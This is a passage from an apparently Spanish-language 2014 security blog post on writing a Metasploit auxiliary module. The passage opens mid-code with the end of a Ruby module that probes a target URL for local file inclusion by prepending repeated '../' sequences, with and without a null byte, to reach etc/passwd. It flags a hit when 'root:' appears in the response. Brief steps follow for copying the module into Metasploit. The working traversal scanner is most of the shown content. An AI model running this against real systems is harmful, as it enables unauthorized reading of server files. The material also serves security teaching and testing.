</span><span class='line'>                   <span class="no">OptInt</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;TRAVERSAL&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Path traversal&#39;</span><span class="o">]</span><span class="p">)</span><span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">run</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">def</span> <span class="nf">conn</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">host</span><span class="o">=</span><span class="no">URI</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">compr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="n">data</span> <span class="o">=~</span> <span class="sr">/root:/</span>
</span><span class='line'>            <span class="nb">puts</span> <span class="s2">&quot;Parametro vulnerable a LFI -&gt; </span><span class="si">#{</span><span class="n">vector</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
</span><span class='line'>        <span class="k">else</span>
</span><span class='line'>            <span class="nb">puts</span> <span class="s2">&quot;Not Found -&gt; </span><span class="si">#{</span><span class="n">vector</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">lfi</span><span class="p">(</span><span class="n">web</span><span class="p">,</span> <span class="n">pb</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">a</span><span class="o">=</span><span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">while</span> <span class="n">a</span><span class="o">&lt;</span><span class="n">pb</span>
</span><span class='line'>            <span class="n">a</span><span class="o">=</span><span class="n">a</span><span class="o">+</span><span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">traversal</span><span class="o">=</span><span class="s2">&quot;../&quot;</span><span class="o">*</span><span class="n">a</span><span class="o">+</span><span class="n">file</span>
</span><span class='line'>            <span class="n">vector</span><span class="o">=</span><span class="n">web</span><span class="o">+</span><span class="n">traversal</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">data</span><span class="o">=</span><span class="n">conn</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">compr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">lfi</span><span class="p">(</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;RHOST&#39;</span><span class="o">]</span><span class="p">,</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;TRAVERSAL&#39;</span><span class="o">]</span><span class="p">,</span> <span class="s2">&quot;etc/passwd&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">lfi</span><span class="p">(</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;RHOST&#39;</span><span class="o">]</span><span class="p">,</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;TRAVERSAL&#39;</span><span class="o">]</span><span class="p">,</span> <span class="s2">&quot;etc/passwd%00&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Para terminar agregaremos el auxiliar a msf, crearemos un direcotorio en /opt/metasploit/apps/pro/msf3/modules/auxiliary y copiaremos nuestro script dentro.</p>

<p>Luego accederemos a el.</p>

<p><img src="http://i.imgur.com/0ueSEgq.png"></p>

<p><img src="http://i.imgur.com/qL8scnG.png"></p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">q3rv0</span></span>

      




<time class='entry-date' datetime='2014-11-23T03:20:10+06:30'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>3:20 am</span></time>
      


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://q3rv0.github.io/blog/2014/11/23/escribiendo-un-auxiliar-para-msf/" data-via="q3rv0" data-counturl="http://q3rv0.github.io/blog/2014/11/23/escribiendo-un-auxiliar-para-msf/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2014/11/23/mysqli-eb-con-extractvalue/" title="Previous Post: MYSQLI EB con extractvalue()">&laquo; MYSQLI EB con extractvalue()</a>
      
      
        <a class="basic-alignment right" href="/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i/" title="Next Post: Tomando el control de una camara AXIS – Parte I">Tomando el control de una camara AXIS – Parte I &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2014/11/23/desbordando-el-buffer-en-linux-x86-i/">Desbordando El Buffer en Linux X86 (I)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i/">Tomando El Control De Una Camara AXIS – Parte I</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/23/escribiendo-un-auxiliar-para-msf/">Escribiendo Un Auxiliar Para MSF</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/23/mysqli-eb-con-extractvalue/">MYSQLI EB Con Extractvalue()</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/23/lfi-plus-sqli-incluyendo-ficheros-a-travez-de-valores-enteros/">LFI+SQLI [Incluyendo Ficheros a Travez De Valores Enteros]</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - q3rv0 -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
